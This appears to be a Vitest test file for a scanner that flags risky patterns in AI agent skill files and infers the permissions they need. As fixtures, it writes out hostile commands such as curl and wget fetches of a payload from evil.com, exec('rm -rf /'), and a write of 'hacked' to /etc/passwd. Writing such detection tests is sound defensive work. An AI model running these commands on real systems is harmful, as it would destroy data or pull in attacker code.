import { describe, test, expect } from "vitest";
import { scanCode, analyzePermissions } from "./security-auditor-scan";
describe("scanCode", () => {
  test("detects curl usage", () => {
    const files = [
      {
        relPath: "SKILL.md",
        content: "Run: curl https://evil.com/payload",
        lineCount: 1,
      },
    ];
    const results = scanCode(files);
    const networkCat = results.find((r) => r.category === "Network requests");
    expect(networkCat).toBeDefined();
    expect(networkCat!.matches.some((m) => m.match.includes("curl"))).toBe(
      true,
    );
    expect(networkCat!.matches[0].severity).toBe("critical");
  });

  test("detects wget usage", () => {
    const files = [
      {
        relPath: "SKILL.md",
        content: "Run: wget https://evil.com/payload",
        lineCount: 1,
      },
    ];
    const results = scanCode(files);
    const networkCat = results.find((r) => r.category === "Network requests");
    expect(networkCat).toBeDefined();
    expect(networkCat!.matches.some((m) => m.match.includes("wget"))).toBe(
      true,
    );
  });

  test("detects exec usage", () => {
    const files = [
      {
        relPath: "script.js",
        content: "const result = exec('ls -la');",
        lineCount: 1,
      },
    ];
    const results = scanCode(files);
    const shellCat = results.find((r) => r.category === "Shell execution");
    expect(shellCat).toBeDefined();
    expect(shellCat!.matches[0].severity).toBe("critical");
  });

  test("detects child_process", () => {
    const files = [
      {
        relPath: "index.js",
        content: 'const { exec } = require("child_process");',
        lineCount: 1,
      },
    ];
    const results = scanCode(files);
    const shellCat = results.find((r) => r.category === "Shell execution");
    expect(shellCat).toBeDefined();
  });

  test("detects eval usage", () => {
    const files = [
      {
        relPath: "SKILL.md",
        content: "Use eval() to process dynamic input",
        lineCount: 1,
      },
    ];
    const results = scanCode(files);
    const codeCat = results.find(
      (r) => r.category === "Dynamic code execution",
    );
    expect(codeCat).toBeDefined();
    expect(codeCat!.matches[0].severity).toBe("critical");
  });

  test("detects external URLs (not github/localhost)", () => {
    const files = [
      {
        relPath: "SKILL.md",
        content: "Visit https://suspicious-site.com/api",
        lineCount: 1,
      },
    ];
    const results = scanCode(files);
    const urlCat = results.find((r) => r.category === "External URLs");
    expect(urlCat).toBeDefined();
  });

  test("does NOT flag github.com URLs as external", () => {
    const files = [
      {
        relPath: "SKILL.md",
        content: "Visit https://github.com/user/repo",
        lineCount: 1,
      },
    ];
    const results = scanCode(files);
    const urlCat = results.find((r) => r.category === "External URLs");
    expect(urlCat).toBeUndefined();
  });

  test("does NOT flag localhost URLs as external", () => {
    const files = [
      {
        relPath: "SKILL.md",
        content: "Visit https://localhost:3000/api",
        lineCount: 1,
      },
    ];
    const results = scanCode(files);
    const urlCat = results.find((r) => r.category === "External URLs");
    expect(urlCat).toBeUndefined();
  });

  test("detects embedded credentials", () => {
    const files = [
      {
        relPath: "config.ts",
        content: "API_KEY = 'sk-1234567890'",
        lineCount: 1,
      },
    ];
    const results = scanCode(files);
    const credCat = results.find((r) => r.category === "Embedded credentials");
    expect(credCat).toBeDefined();
    expect(credCat!.matches[0].severity).toBe("critical");
  });

  test("detects process.env access", () => {
    const files = [
      {
        relPath: "index.ts",
        content: "const key = process.env.OPENAI_KEY;",
        lineCount: 1,
      },
    ];
    const results = scanCode(files);
    const envCat = results.find(
      (r) => r.category === "Environment variable access",
    );
    expect(envCat).toBeDefined();
    expect(envCat!.matches[0].severity).toBe("info");
  });

  test("detects obfuscation patterns", () => {
    const files = [
      {
        relPath: "script.js",
        content: "const decoded = atob('c2VjcmV0');",
        lineCount: 1,
      },
    ];
    const results = scanCode(files);
    const obfCat = results.find((r) => r.category === "Obfuscation patterns");
    expect(obfCat).toBeDefined();
  });

  test("detects fetch() calls", () => {
    const files = [
      {
        relPath: "api.ts",
        content: "const res = await fetch('https://api.example.com');",
        lineCount: 1,
      },
    ];
    const results = scanCode(files);
    const networkCat = results.find((r) => r.category === "Network requests");
    expect(networkCat).toBeDefined();
    expect(networkCat!.matches.some((m) => m.severity === "warning")).toBe(
      true,
    );
  });

  test("returns empty array for clean content", () => {
    const files = [
      {
        relPath: "SKILL.md",
        content: `---
name: clean-skill
version: 1.0.0
---

# Clean Skill

This skill does simple text transformation.
No network calls, no shell commands, no eval.
`,
        lineCount: 10,
      },
    ];
    const results = scanCode(files);
    expect(results.length).toBe(0);
  });

  test("reports correct file and line number", () => {
    const files = [
      {
        relPath: "multi.md",
        content: "line 1\nline 2\ncurl http://evil.com\nline 4",
        lineCount: 4,
      },
    ];
    const results = scanCode(files);
    const networkCat = results.find((r) => r.category === "Network requests");
    expect(networkCat).toBeDefined();
    const curlMatch = networkCat!.matches.find((m) => m.match.includes("curl"));
    expect(curlMatch!.line).toBe(3);
    expect(curlMatch!.file).toBe("multi.md");
  });

  test("truncates long lines", () => {
    const longLine = "curl " + "a".repeat(200);
    const files = [{ relPath: "long.md", content: longLine, lineCount: 1 }];
    const results = scanCode(files);
    const networkCat = results.find((r) => r.category === "Network requests");
    expect(networkCat).toBeDefined();
    const match = networkCat!.matches[0];
    expect(match.match.length).toBeLessThanOrEqual(123); // 120 + "..."
  });

  test("scans multiple files", () => {
    const files = [
      { relPath: "a.md", content: "curl https://evil.com", lineCount: 1 },
      { relPath: "b.js", content: "eval('code')", lineCount: 1 },
    ];
    const results = scanCode(files);
    expect(results.length).toBeGreaterThanOrEqual(2);
    expect(results.some((r) => r.category === "Network requests")).toBe(true);
    expect(results.some((r) => r.category === "Dynamic code execution")).toBe(
      true,
    );
  });
});

// ─── analyzePermissions tests ───────────────────────────────────────────────

describe("analyzePermissions", () => {
  test("extracts shell permission from shell execution findings", () => {
    const scans = scanCode([
      { relPath: "SKILL.md", content: "exec('rm -rf /')", lineCount: 1 },
    ]);
    const perms = analyzePermissions(scans);
    expect(perms.some((p) => p.type === "shell")).toBe(true);
  });

  test("extracts network permission from curl/wget", () => {
    const scans = scanCode([
      { relPath: "SKILL.md", content: "curl https://evil.com", lineCount: 1 },
    ]);
    const perms = analyzePermissions(scans);
    expect(perms.some((p) => p.type === "network")).toBe(true);
  });

  test("extracts filesystem permission from writeFile", () => {
    const scans = scanCode([
      {
        relPath: "script.js",
        content: "writeFile('/etc/passwd', 'hacked')",
        lineCount: 1,
      },
    ]);
    const perms = analyzePermissions(scans);
    expect(perms.some((p) => p.type === "filesystem")).toBe(true);
  });

  test("extracts code-execution permission from eval", () => {
    const scans = scanCode([
      { relPath: "SKILL.md", content: "eval(userInput)", lineCount: 1 },
    ]);
    const perms = analyzePermissions(scans);
    expect(perms.some((p) => p.type === "code-execution")).toBe(true);
  });

  test("extracts environment permission from process.env", () => {
    const scans = scanCode([
      {
        relPath: "config.ts",
        content: "const key = process.env.KEY;",
        lineCount: 1,
      },
    ]);
    const perms = analyzePermissions(scans);
    expect(perms.some((p) => p.type === "environment")).toBe(true);
  });

  test("returns empty for clean code", () => {
    const scans = scanCode([
      { relPath: "SKILL.md", content: "This is clean code.", lineCount: 1 },
    ]);
    const perms = analyzePermissions(scans);
    expect(perms.length).toBe(0);
  });

  test("includes reason for each permission", () => {
    const scans = scanCode([
      { relPath: "SKILL.md", content: "exec('ls')", lineCount: 1 },
    ]);
    const perms = analyzePermissions(scans);
    const shellPerm = perms.find((p) => p.type === "shell");
    expect(shellPerm).toBeDefined();
    expect(shellPerm!.reason).toBeTruthy();
    expect(shellPerm!.reason.length).toBeGreaterThan(0);
  });

  test("sorts permissions by risk (shell first)", () => {
    const scans = scanCode([
      {
        relPath: "SKILL.md",
        content: "process.env.KEY\ncurl http://a.com\nexec('ls')",
        lineCount: 3,
      },
    ]);
    const perms = analyzePermissions(scans);
    if (perms.length >= 2) {
      const shellIdx = perms.findIndex((p) => p.type === "shell");
      const envIdx = perms.findIndex((p) => p.type === "environment");
      if (shellIdx !== -1 && envIdx !== -1) {
        expect(shellIdx).toBeLessThan(envIdx);
      }
    }
  });
});

// ─── calculateVerdict tests ─────────────────────────────────────────────────
